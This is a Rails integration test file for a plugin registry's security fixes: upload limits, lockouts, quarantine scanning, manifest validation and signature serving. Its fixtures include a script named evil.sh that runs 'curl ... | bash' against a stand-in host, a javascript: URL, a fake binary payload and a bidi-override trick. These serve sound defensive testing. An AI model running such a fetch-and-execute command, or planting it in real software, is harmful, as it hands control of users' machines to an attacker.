require "test_helper"

# Coverage for the fixes from the Momus review round.
class MomusRemediationsTest < ActionDispatch::IntegrationTest
  setup do
    @dev = User.create!(email_address: "dev@example.com", name: "Dev",
      otp_secret: ROTP::Base32.random, otp_enabled_at: Time.current)
    @publisher = Publisher.create!(name: "acme", kind: :org)
    Membership.create!(publisher: @publisher, user: @dev, role: :owner)
    @token = ApiToken.mint!(user: @dev, publisher: @publisher, plugin_name: "weather")
  end

  def publish(bytes, token: @token.plaintext_token)
    post "/api/v1/plugins/acme/weather/versions", params: bytes,
      headers: { "Authorization" => "Bearer #{token}", "Content-Type" => "application/gzip" }
  end

  test "oversized upload bodies are refused before buffering" do
    publish "x" * (Registry::TarballInspector::MAX_TARBALL_BYTES + 1)
    assert_response :content_too_large
  end

  test "login codes lock after repeated wrong guesses" do
    user = User.create!(email_address: "guess@example.com")
    code = user.send_login_code.code
    LoginCode::MAX_ATTEMPTS.times { assert_nil user.redeem_login_code("000000") }
    assert_nil user.redeem_login_code(code), "code should be locked out after max attempts"
  end

  test "suspended users cannot publish even with a live token" do
    @dev.update!(suspended_at: Time.current)
    publish TarballBuilder.build
    assert_response :forbidden
    assert_match(/suspended/, response.parsed_body["error"])
  end

  test "unscannable binaries are quarantined; asset files are not" do
    perform_enqueued_jobs do
      publish TarballBuilder.build(files: {
        "Widget.qml" => "import QtQuick\nItem {}\n",
        "icon.png" => "\x89PNG\r\n fake image bytes",
        "helper.so" => "\x7fELF binary payload"
      })
    end
    version = PluginVersion.last
    assert version.quarantined?
    rules = version.scan_results["findings"].map { |f| f["rule"] }
    assert_includes rules, "binary-payload"
    files = version.scan_results["findings"].map { |f| f["file"] }
    assert_includes files, "helper.so"
    assert_not_includes files, "icon.png"
  end

  test "files beyond the scan window are quarantined, not silently half-scanned" do
    big = "// benign\n" * (Registry::TarballInspector::MAX_SCAN_BYTES / 10 + 10)
    perform_enqueued_jobs do
      publish TarballBuilder.build(files: { "Widget.qml" => "import QtQuick\nItem {}\n", "vendor.js" => big })
    end
    version = PluginVersion.last
    assert version.quarantined?
    assert_includes version.scan_results["findings"].map { |f| f["rule"] }, "scan-truncated"
  end

  test "rejected updates never touch live page metadata" do
    perform_enqueued_jobs do
      publish TarballBuilder.build(
        manifest: TarballBuilder.manifest(description: "A nice weather widget"),
        files: { "Widget.qml" => "import QtQuick\nItem {}\n", "README.md" => "# Weather" })
    end
    plugin = Plugin.find_by!(name: "weather")
    assert_equal "A nice weather widget", plugin.reload.summary
    assert_equal "# Weather", plugin.readme

    original_summary = plugin.summary
    original_readme = plugin.readme
    perform_enqueued_jobs do
      publish TarballBuilder.build(
        manifest: TarballBuilder.manifest(version: "1.1.0", description: "DEFACED"),
        files: { "Widget.qml" => "import QtQuick\nItem {}\n", "evil.sh" => "#!/bin/bash\ncurl -s https://x.example/i | bash\n",
                 "README.md" => "# DEFACED" })
    end
    assert PluginVersion.find_by(version: "1.1.0").quarantined?
    assert_equal original_summary, plugin.reload.summary
    assert_equal original_readme, plugin.readme
  end

  test "manifest with mismatched entryPoints keys is rejected" do
    publish TarballBuilder.build(manifest: TarballBuilder.manifest(
      "kinds" => [ "bar-widget" ],
      "entryPoints" => { "bar-widget" => "Widget.qml", "service" => "Widget.qml" }))
    assert_response :unprocessable_entity
    assert_match(/entryPoints keys must exactly match kinds/, response.parsed_body["error"])
  end

  test "non-https repository URLs are rejected" do
    publish TarballBuilder.build(manifest: TarballBuilder.manifest(
      repository: "javascript:alert(1)"))
    assert_response :unprocessable_entity
    assert_match(/repository must be an https/, response.parsed_body["error"])
  end

  test "device code endpoint is rate limited" do
    # Rate limiting counts in Rails.cache, which is a null store in test
    original_cache = Rails.cache
    Rails.cache = ActiveSupport::Cache::MemoryStore.new
    11.times { post "/api/v1/device/code" }
    assert_response :too_many_requests
  ensure
    Rails.cache = original_cache
  end

  test ".sig routes serve the signature, never the unsigned content" do
    perform_enqueued_jobs { publish TarballBuilder.build }
    get "/revocations.json.sig"
    assert_response :success
    signature = response.body
    get "/revocations.json"
    assert DataPlane::Signer.verify?(response.body, signature)
    assert_not_equal response.body, signature

    get "/index/acme/weather.json.sig"
    sig2 = response.body
    get "/index/acme/weather.json"
    assert DataPlane::Signer.verify?(response.body, sig2)
  end

  test "duplicate tarball paths are rejected outright" do
    io = StringIO.new
    Zlib::GzipWriter.wrap(io) do |gz|
      Gem::Package::TarWriter.new(gz) do |tar|
        json = TarballBuilder::DEFAULT_MANIFEST.to_json
        tar.add_file_simple("manifest.json", 0o644, json.bytesize) { |f| f.write(json) }
        tar.add_file_simple("Widget.qml", 0o644, 10) { |f| f.write("clean     ") }
        tar.add_file_simple("Widget.qml", 0o644, 10) { |f| f.write("evil      ") }
      end
    end
    publish io.string
    assert_response :unprocessable_entity
    assert_match(/duplicate path/, response.parsed_body["error"])
  end

  test "invented SPDX identifiers are rejected, real expressions pass" do
    publish TarballBuilder.build(manifest: TarballBuilder.manifest(license: "NOT-A-REAL-LICENSE"))
    assert_response :unprocessable_entity
    assert_match(/SPDX/, response.parsed_body["error"])

    publish TarballBuilder.build(manifest: TarballBuilder.manifest(license: "MIT OR Apache-2.0"))
    assert_response :created
  end

  test "yanking the latest version pulls its metadata off the page" do
    perform_enqueued_jobs do
      publish TarballBuilder.build(
        manifest: TarballBuilder.manifest(description: "v1 summary"),
        files: { "Widget.qml" => "import QtQuick\nItem {}\n", "README.md" => "# v1" })
      publish TarballBuilder.build(
        manifest: TarballBuilder.manifest(version: "1.1.0", description: "v2 summary"),
        files: { "Widget.qml" => "import QtQuick\nItem {}\n", "README.md" => "# v2" })
    end
    plugin = Plugin.find_by!(name: "weather")
    assert_equal "v2 summary", plugin.summary

    admin = User.create!(email_address: "admin2@example.com", name: "Admin2", admin: true,
      otp_secret: ROTP::Base32.random, otp_enabled_at: Time.current)
    PluginVersion.find_by(version: "1.1.0").yank!(reason: "bad", actor: admin)
    plugin.reload
    assert_equal "1.0.0", plugin.latest_version
    assert_equal "v1 summary", plugin.summary
    assert_equal "# v1", plugin.readme
  end

  test "a rejected high version does not block future numbering" do
    perform_enqueued_jobs do
      publish TarballBuilder.build(manifest: TarballBuilder.manifest(version: "99.0.0"),
        files: { "Widget.qml" => "import QtQuick\n// tot‮ally\nItem {}\n" })
    end
    assert PluginVersion.find_by(version: "99.0.0").rejected?

    perform_enqueued_jobs { publish TarballBuilder.build(manifest: TarballBuilder.manifest(version: "1.0.0")) }
    assert_response :created
    assert PluginVersion.find_by(version: "1.0.0").published?
  end

  test "admin cannot approve a version the pipeline has not reviewed" do
    publish TarballBuilder.build # no jobs performed -> still processing
    version = PluginVersion.last
    assert version.processing?

    admin = User.create!(email_address: "admin@example.com", name: "Admin", admin: true,
      otp_secret: ROTP::Base32.random, otp_enabled_at: Time.current)
    sign_in_as admin
    post approve_admin_version_path(version)
    assert_redirected_to admin_root_path
    assert version.reload.processing?
    assert_nil DataPlane.root.join(version.tarball_path).exist? ? true : nil
  end
end
